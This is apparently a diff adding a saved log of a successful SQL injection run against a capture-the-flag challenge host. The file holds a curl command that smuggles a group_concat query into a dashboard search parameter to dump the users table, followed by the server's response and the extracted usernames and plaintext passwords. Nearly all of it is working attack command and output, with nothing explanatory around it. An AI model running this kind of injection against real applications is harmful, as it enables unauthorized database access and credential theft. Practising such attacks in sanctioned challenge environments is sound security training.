@@ -1,0 +1,13 @@
+# Captured: 2026-10-10 19:25 UTC (successful run)
+
+$ curl -sS -k -b cookies.txt --get \
+    'https://kicyber-81cdac2d8817-devnote-0-0.chals.io/dashboard' \
+    --data-urlencode "q=group_concat(id||':'||username||':'||password, char(10)) FROM users"
+<pre>[{"group_concat(id||':'||username||':'||password, char(10))": "1:admin:Adm1n_Ultra_S3cr3t!
+2:dev:devpassword123
+3:guest:guest123"}]</pre>
+
+# Extracted:
+#   admin : Adm1n_Ultra_S3cr3t!
+#   dev   : devpassword123
+#   guest : guest123
